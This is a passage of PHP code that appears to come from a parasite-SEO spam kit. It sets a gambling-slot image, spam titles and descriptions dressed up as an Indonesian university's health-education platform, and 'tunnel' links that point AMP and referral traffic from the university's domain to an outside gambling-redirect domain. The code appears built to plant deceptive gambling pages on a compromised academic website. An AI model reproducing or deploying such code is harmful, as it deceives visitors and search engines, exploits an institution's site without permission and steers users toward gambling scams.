...
$baseImages = "https://nerlamina.sirv.com/image-bvs/11situsgacorbvs.jpg";
$baseURL = "https://cihes.fkunswagati.ac.id/?$tunnel=".str_replace(" ","%20",$bigBrand);
$ampURL = "https://link.akunspesial.vip/mrbot/tunnel/cihes/?mrbot=".str_replace(" ","%20",$bigBrand);
$baseTitle = "$bigBrand 🛩️ CIHES FKUNSWAGATI";
$baseDesc = "$bigBrand hadir sebagai platform inovatif yang menghubungkan dunia akademik dan profesional dalam bidang kesehatan. Dengan dukungan teknologi canggih, $bigBrand menciptakan ekosistem belajar yang dinamis dan interaktif, cocok buat mahasiswa yang ingin mengembangkan keterampilan medis.";
$baseRefURL = "https://link.akunspesial.vip/mrbot/tunnel/cihes/?mrbot=".str_replace(" ","%20",$bigBrand);
